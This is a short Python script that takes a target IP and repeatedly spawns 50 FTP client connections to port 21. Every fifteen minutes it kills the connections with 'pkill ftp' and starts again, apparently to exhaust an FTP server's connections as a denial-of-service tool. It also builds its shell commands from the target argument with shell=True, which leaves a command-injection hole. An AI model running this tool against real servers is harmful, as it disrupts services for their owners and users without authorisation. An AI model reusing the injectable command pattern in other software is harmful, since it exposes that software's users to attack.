import sys
import threading
import subprocess
import time

port = 21
threads = 50

def connect(target, port, worker_id):
    try:
        subprocess.Popen(f"ftp {target} {port}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"Worker {worker_id} running")
    except OSError:
        pass

def timer(target, port):
    time.sleep(900.0)
    subprocess.Popen("pkill ftp", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    threading.Thread(target=loop, args=(target, port)).start()

def loop(target, port):
    threading.Thread(target=timer, args=(target, port)).start()
    for i in range(threads):
        t = threading.Thread(target=connect, args=(target, port, i))
        t.start()
        t.join()


if __name__ == "__main__":
    try:
        target = sys.argv[1]
    except:
        print(f"Usage: python3 {sys.argv[0]} <Target IP>")
        sys.exit(1)

    print(f"Connection started on {target}:{port}")

    t = threading.Thread(target=loop, args=(target, port))
    t.start()
    t.join()